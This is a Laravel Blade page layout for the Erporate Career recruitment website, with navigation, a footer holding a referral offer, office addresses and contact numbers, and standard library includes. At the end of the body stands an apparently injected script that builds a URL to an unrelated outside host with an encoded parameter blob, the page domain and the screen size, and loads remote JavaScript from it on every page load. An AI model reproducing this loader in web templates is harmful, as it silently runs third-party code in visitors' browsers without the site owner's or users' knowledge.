<!DOCTYPE html>
<html class="no-js" lang="{{ app()->getLocale() }}">
<head> 
    <meta charset="UTF-8"> 
    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index,follow"> 
    
    <meta property="og:site_name" content="Erporate Career">
    <meta property="og:title" content="Erporate Career" />
    <meta property="og:description" content="We develop your passions - Build Talent" />
    <meta property="og:image" itemprop="image" content="{{ asset('public/img/logo3.png') }}">
    <meta property="og:type" content="website" />

    <meta charset="utf-8">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Career Erporate</title>
    <link rel="shortcut icon" href="{{ asset('public/favicon.ico') }}">
    <link rel="stylesheet" href="{{ asset('public/css/bootstrap.min.css') }}"> 
    <link rel="stylesheet" href="{{ asset('public/css/bootstrap-theme.min.css') }}"> 
    <link rel="stylesheet" href="{{ asset('public/css/bootstrap-select.min.css') }}"> 
    <link rel="stylesheet" type="text/css" href="{{ asset('public/css/prettify.css') }}"> 
    <link href="{{ asset('public/css/font-awesome.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/line-font.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/animate.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/bootsnav.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/style.css') }}" rel="stylesheet"> 
    <link rel="stylesheet" type="text/css" href="{{ asset('public/css/sweetalert2.min.css') }}">
    <link type="text/css" rel="stylesheet" id="jssDefault" href="{{ asset('public/css/colors/green-style.css') }}"> 
    <link href="{{ asset('public/css/responsiveness.css') }}" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datetimepicker/4.17.47/css/bootstrap-datetimepicker.css">
    <link rel="stylesheet" type="text/css" href="{{asset('public/css/daterangepicker.css')}}" />
    <link rel="stylesheet" type="text/css" href="{{ asset('public/css/sweetalert2.min.css') }}">

  </head>
  <body>
    <div class="wrapper"> 
      <nav class="navbar navbar-default navbar-fixed navbar-transparent white bootsnav"> 
        <div class="container"> 
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-menu">
            <i class="fa fa-bars">
            </i>
          </button> 
          <div class="navbar-header"> 
            <a class="navbar-brand" href="http:\\erporate.com">
              <img src="{{ asset('public/img/logo.png') }}" class="logo logo-display" alt="">
              <img src="{{asset('public/img/logo2.png')}}" class="logo logos logo-scrolled" alt="">
            </a> 
          </div>
          <div class="collapse navbar-collapse" id="navbar-menu"> 
            <ul class="nav navbar-nav navbar-right" data-in="fadeInDown" data-out="fadeOutUp"> 
              <li>
                <a href="{{ route('index') }} " class="active">HOME</a>
              </li>
              <li>
                <a href="{{ route('bootcamp') }}">BOOTCAMP</a>
              </li>
              <li>
                <a href="{{ route('info') }}">PROCEDURE</a>
              </li>
            </ul> 
          </div>
        </div>
      </nav> 
      <div class="clearfix">
      </div>

      @yield('content')

      <footer class="footer"> 
        <div class="row no-padding"> 
          <div class="container"> 
            <div class="col-md-4 col-sm-12"> 
              <div class="footer-widget"> 
                <h3 class="widgettitle widget-title">REFERRAL PROGRAM
                </h3> 
                <div class="textwidget"> 
                  <!-- @foreach($bootcamps as $bootcamp)
                  <p><a href="{{ url('/bootcamp/'.$bootcamp->bootcamp_id) }}">{{ $bootcamp->bootcamp_title }}
                  </a></p>
                  @endforeach -->
                  <P>Get <strong>IDR 500.000</strong></P>
                  <p>just referral your friend to join us until hired.</p>
                  <p>We will give you the notice and the money after ask your referral from who</P>
                  <p>For more information please contact HRD</p>
                </div>
              </div>
            </div>
            <div class="col-md-5 col-sm-4"> 
              <div class="footer-widget"> 
                <h3 class="widgettitle widget-title">ADDRESS
                </h3> 
                <div class="textwidget"> 
                  <div class="textwidget"> 
                    <ul class="footer-navigation"> 
                      <li>
                        <a title=""><strong>Jakarta</strong>
                        </a><br>
                        Jakarta Barat Madison Park, Magnolia Tower 10BJ. <br>
                        Tanjung Duren Selatan
                      </li>
                      <li>
                        <a title=""><strong>Yogyakarta</strong>
                        </a><br>Jl. Wirajaya No. 310A RT 01/02, Kelurahan Condong Catur.<br>
                        Depok, Sleman
                      </li>
                    </ul> 
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-3 col-sm-4"> 
              <div class="footer-widget"> 
                <h3 class="widgettitle widget-title">CONTACT
                </h3> 
                <div class="textwidget"> 
                  <ul class="footer-navigation"> 
                    <li>(0274) 4331734
                    </li>
                    <li>
                      085749487679 (Business)
                    </li>
                    <li>081393733771 (HRD)</li>
                    <li>085742486880 (HRD)</li>
                  </ul>
                  <ul class="footer-social"> 
                    <li>
                      <a href="https://www.facebook.com/erporate">
                        <i class="fa fa-facebook"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://plus.google.com/100771217264928077260">
                        <i class="fa fa-google-plus"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://twitter.com/erporate">
                        <i class="fa fa-twitter"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://www.linkedin.com/company/pterporatesolusiglobal">
                        <i class="fa fa-linkedin"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://www.instagram.com/erporate.indonesia">
                        <i class="fa fa-instagram"></i>
                      </a>
                    </li>
                  </ul>  
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="row copyright"> 
          <div class="container"> 
            <p>Copyright PT Erporate Solusi Global - Career © 2018. All Rights Reserved 
            </p>
          </div>
        </div>
      </footer>  
      <div class="clearfix">
      </div>
      
      
      <script type="text/javascript" src="{{ asset('public/js/jquery.min.js') }}">
      </script> 
      <script src="{{ asset('public/js/bootstrap.min.js') }}">
      </script> 
      <script src="{{ asset('public/js/bootsnav.js') }}">
      </script> 
      <script src="{{ asset('public/js/viewportchecker.js') }}">
      </script> 
      <script src="{{ asset('public/js/bootstrap-select.min.js') }}">
      </script> 
      <script src="{{ asset('public/js/jQuery.style.switcher.js') }}">
      </script> 
      <script src="{{ asset('public/js/custom.js') }}">
      </script>
        <script type="text/javascript" src="{{ asset('public/js/sweetalert2.min.js') }}"></script>
        <script type="text/javascript" src="{{ asset('public/js/validator.js') }}"></script>
        <script type="text/javascript" src="{{asset('public/js/momment.js')}}"></script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datetimepicker/4.17.47/js/bootstrap-datetimepicker.min.js"></script>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.min.js"></script>
     
    </div>
    
    <script type="text/javascript">if (self==top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }
                     , 0);
        }
        function sync(fn) {
          fn();
        }


        function requestCfs(){
          var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random()*99999999999);
          var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mQ4YEQwQBqR1oV%2bCxvsYeZrMKp2nbFDJ5rZq%2fi96Zf9hKtE2jv5o3U%2fjR0UNndgHnO7SezLJ1ynk6AMfmTx2bI7BlmXQmidluBoEU8U0J5RSxIDwEi9pYxyiZv6%2fo0TjsllsWnuv8gc9e%2fUSq0xORGGQvao9ItYU5AjfZVPrQNwcWaZ5YCahby4OmCDRtY%2fgmdhh7Ar1J9hvEqggNFo7han4fvr9BsJVRiu1JK3EKdd%2bXWkoqaelcJa7JgtwqyLynpNaLwdmbHbE%2f%2f9swAWFqj%2fML8GcadLNm6VeYjqpTkfXTdsd1Dj6HMJ1BkAjttMyZ1krB83okP3Rkh33zEcLTS1w8K5oFX36epPGOUYMQ4HdfTDsMCqUHA9iiflcGacr8ehtpaen0luYC3BeZxzFQEl0lNsauKXTZ6VaFcCy0Nuxhxk8h3co6XTDpf5cdQ%2br9ozWXLiwgFwaMOQloYYHOXFx%2fGtD5XP%2fhSDFC0TNMWePcYobM5qIkpz0%2f%2fhFm8Lp7%2bPHsDUyiMynjC8oT0tqRJQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function(){
        }
                              );
      };
    </script>
  @stack('scripts')

  </body>
</html>